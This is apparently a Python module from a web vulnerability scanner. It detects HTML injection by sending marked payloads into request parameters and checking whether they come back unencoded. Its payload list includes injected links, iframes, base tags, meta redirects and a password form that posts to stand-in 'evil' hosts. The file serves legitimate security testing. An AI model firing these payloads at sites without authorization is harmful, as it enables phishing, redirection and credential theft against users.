"""
HTML Injection Scanner Module

Detects HTML injection vulnerabilities where user input is reflected
in HTML content without proper sanitization, allowing injection of
HTML elements (but not JavaScript - that's XSS).
"""

from typing import List, Dict, Any
from core.base_module import BaseModule
from core.logger import get_logger
import re
import random
import string

logger = get_logger(__name__)


class HTMLInjectionModule(BaseModule):
    """HTML Injection Scanner Module"""

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize HTML Injection module"""
        super().__init__(module_path, payload_limit=payload_limit)

        # Generate unique marker for detection (prevents false positives)
        self.marker = ''.join(random.choices(string.ascii_lowercase, k=8))

        # HTML injection payloads with unique markers
        self.html_payloads = [
            # Basic formatting tags
            {
                'payload': f'<b>INJECT_{self.marker}</b>',
                'detect': f'<b>INJECT_{self.marker}</b>',
                'tag': 'b',
                'description': 'Bold tag injection'
            },
            {
                'payload': f'<i>INJECT_{self.marker}</i>',
                'detect': f'<i>INJECT_{self.marker}</i>',
                'tag': 'i',
                'description': 'Italic tag injection'
            },
            {
                'payload': f'<u>INJECT_{self.marker}</u>',
                'detect': f'<u>INJECT_{self.marker}</u>',
                'tag': 'u',
                'description': 'Underline tag injection'
            },
            {
                'payload': f'<h1>INJECT_{self.marker}</h1>',
                'detect': f'<h1>INJECT_{self.marker}</h1>',
                'tag': 'h1',
                'description': 'Heading tag injection'
            },
            # Structural tags
            {
                'payload': f'<div id="inj_{self.marker}">TEST</div>',
                'detect': f'id="inj_{self.marker}"',
                'tag': 'div',
                'description': 'Div element injection'
            },
            {
                'payload': f'<span class="inj_{self.marker}">TEST</span>',
                'detect': f'class="inj_{self.marker}"',
                'tag': 'span',
                'description': 'Span element injection'
            },
            # Link injection (phishing risk)
            {
                'payload': f'<a href="https://evil_{self.marker}.com">Click</a>',
                'detect': f'href="https://evil_{self.marker}.com"',
                'tag': 'a',
                'description': 'Anchor tag injection (phishing risk)'
            },
            # Image injection
            {
                'payload': f'<img src="x" alt="inj_{self.marker}">',
                'detect': f'alt="inj_{self.marker}"',
                'tag': 'img',
                'description': 'Image tag injection'
            },
            # Form injection (credential theft risk)
            {
                'payload': f'<form action="https://evil_{self.marker}.com"><input name="pass" type="password"></form>',
                'detect': f'action="https://evil_{self.marker}.com"',
                'tag': 'form',
                'description': 'Form injection (credential theft risk)'
            },
            # Iframe injection
            {
                'payload': f'<iframe src="https://evil_{self.marker}.com"></iframe>',
                'detect': f'<iframe src="https://evil_{self.marker}.com"',
                'tag': 'iframe',
                'description': 'Iframe injection'
            },
            # Style injection
            {
                'payload': f'<style>.inj_{self.marker}{{color:red}}</style>',
                'detect': f'.inj_{self.marker}',
                'tag': 'style',
                'description': 'Style tag injection'
            },
            # Base tag injection (URL hijacking)
            {
                'payload': f'<base href="https://evil_{self.marker}.com/">',
                'detect': f'<base href="https://evil_{self.marker}.com/',
                'tag': 'base',
                'description': 'Base tag injection (URL hijacking)'
            },
            # Meta refresh (redirect)
            {
                'payload': f'<meta http-equiv="refresh" content="0;url=https://evil_{self.marker}.com">',
                'detect': f'url=https://evil_{self.marker}.com',
                'tag': 'meta',
                'description': 'Meta refresh injection (redirect)'
            },
        ]

        logger.info(f"HTML Injection module loaded: {len(self.html_payloads)} payloads")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Scan for HTML injection vulnerabilities

        Args:
            targets: List of URLs with parameters
            http_client: HTTP client

        Returns:
            List of vulnerability results
        """
        results = []

        logger.info(f"Starting HTML Injection scan on {len(targets)} targets")

        for target in targets:
            url = target.get('url')
            params = target.get('params', {})
            method = target.get('method', 'GET').upper()

            if not params:
                logger.debug(f"Skipping {url} - no parameters")
                continue

            # Get baseline response for false positive detection
            try:
                if method == 'POST':
                    baseline_response = http_client.post(url, data=params)
                else:
                    baseline_response = http_client.get(url, params=params)

                if not baseline_response:
                    continue

                baseline_text = getattr(baseline_response, 'text', '')
            except Exception as e:
                logger.debug(f"Error getting baseline for {url}: {e}")
                continue

            # Test each parameter
            for param_name in params:
                if self.should_stop():
                    logger.info("Stop requested, aborting HTML injection scan")
                    return results

                found_vuln = False

                for payload_info in self.html_payloads:
                    if found_vuln:
                        break

                    payload = payload_info['payload']
                    detect_pattern = payload_info['detect']
                    tag = payload_info['tag']
                    description = payload_info['description']

                    try:
                        test_params = params.copy()
                        test_params[param_name] = payload

                        # Send request
                        if method == 'POST':
                            response = http_client.post(url, data=test_params)
                        else:
                            response = http_client.get(url, params=test_params)

                        if not response:
                            continue

                        response_text = getattr(response, 'text', '')

                        # CRITICAL: Check if our unique marker is reflected as HTML
                        if detect_pattern not in response_text:
                            continue

                        # FALSE POSITIVE CHECK 1: Pattern shouldn't exist in baseline
                        if detect_pattern in baseline_text:
                            logger.debug(f"False positive: pattern exists in baseline")
                            continue

                        # FALSE POSITIVE CHECK 2: Verify HTML context (not in script/textarea/comment)
                        if not self._is_html_context(response_text, detect_pattern):
                            logger.debug(f"False positive: not in HTML rendering context")
                            continue

                        # FALSE POSITIVE CHECK 3: Verify payload is not HTML-encoded
                        encoded_pattern = detect_pattern.replace('<', '&lt;').replace('>', '&gt;')
                        if encoded_pattern in response_text and detect_pattern not in response_text:
                            logger.debug(f"False positive: payload is HTML encoded")
                            continue

                        # CONFIRMED VULNERABILITY
                        severity = self._get_tag_severity(tag)
                        evidence = self._build_evidence(url, param_name, payload, detect_pattern, response_text)

                        # Build full HTTP request for report
                        request_str = self._build_request_string(url, method, param_name, payload)

                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            evidence=evidence,
                            description=f"HTML Injection: {description}. User input is reflected as HTML without encoding, allowing content manipulation and potential phishing attacks.",
                            confidence=0.90,
                            severity=severity,
                            method=method,
                            request=request_str,
                            response=response_text[:3000]
                        )

                        # Add extra fields for GUI/report
                        result['tag_type'] = tag
                        result['verified'] = True

                        results.append(result)
                        found_vuln = True
                        logger.info(f"✓ HTML Injection found in {url} (parameter: {param_name}, tag: {tag})")

                    except Exception as e:
                        logger.debug(f"Error testing {param_name} with {tag}: {e}")
                        continue

        logger.info(f"HTML Injection scan complete: {len(results)} vulnerabilities found")
        return results

    def _is_html_context(self, response_text: str, pattern: str) -> bool:
        """
        Verify the pattern appears in a renderable HTML context
        (not inside script, textarea, comment, etc.)
        """
        pos = response_text.find(pattern)
        if pos == -1:
            return False

        # Get context before the pattern
        start = max(0, pos - 500)
        context_before = response_text[start:pos].lower()

        # Check if we're inside non-renderable contexts
        non_render_contexts = [
            ('<script', '</script>'),
            ('<textarea', '</textarea>'),
            ('<style', '</style>'),  # style is actually injectable
            ('<!--', '-->'),
            ('<xmp', '</xmp>'),
            ('<plaintext', '</plaintext>'),
            ('<noscript', '</noscript>'),
        ]

        for open_tag, close_tag in non_render_contexts:
            if open_tag == '<style':
                continue  # Style injection is valid

            last_open = context_before.rfind(open_tag)
            last_close = context_before.rfind(close_tag)

            # If we found an open tag more recently than its close, we're inside
            if last_open != -1 and last_open > last_close:
                return False

        return True

    def _get_tag_severity(self, tag: str) -> str:
        """Determine severity based on injected tag type"""
        # High risk: can steal credentials or redirect users
        high_risk_tags = ['form', 'iframe', 'base', 'meta', 'object', 'embed']

        # Medium risk: can be used for phishing or content manipulation
        medium_risk_tags = ['a', 'img', 'style', 'link', 'div', 'span']

        if tag in high_risk_tags:
            return 'High'
        elif tag in medium_risk_tags:
            return 'Medium'
        else:
            return 'Low'

    def _build_evidence(self, url: str, param: str, payload: str, detect: str, response: str) -> str:
        """Build detailed evidence string"""
        context = self.extract_response_context(response, detect, 150, 100)

        evidence = f"""HTML Injection Confirmed

**Vulnerable URL:** {url}
**Vulnerable Parameter:** {param}
**Injected Payload:** {payload}

**Detection Pattern Found in Response:**
{detect}

**Response Context:**
{context}

**Security Impact:**
- Content spoofing and defacement
- Phishing attacks via injected forms/links
- Clickjacking via iframe injection
- Credential theft via fake login forms
- URL hijacking via base tag injection
"""
        return evidence

    def _build_request_string(self, url: str, method: str, param: str, payload: str) -> str:
        """Build HTTP request string for evidence"""
        from urllib.parse import urlparse, urlencode

        parsed = urlparse(url)
        path = parsed.path or '/'

        if method == 'GET':
            query = urlencode({param: payload})
            request = f"GET {path}?{query} HTTP/1.1\n"
        else:
            request = f"POST {path} HTTP/1.1\n"

        request += f"Host: {parsed.netloc}\n"
        request += "User-Agent: Dominator-Scanner/1.0\n"
        request += "Accept: text/html,*/*\n"

        if method == 'POST':
            body = urlencode({param: payload})
            request += "Content-Type: application/x-www-form-urlencoded\n"
            request += f"Content-Length: {len(body)}\n\n"
            request += body

        return request


def get_module(module_path: str, payload_limit: int = None):
    """Create module instance"""
    return HTMLInjectionModule(module_path, payload_limit=payload_limit)
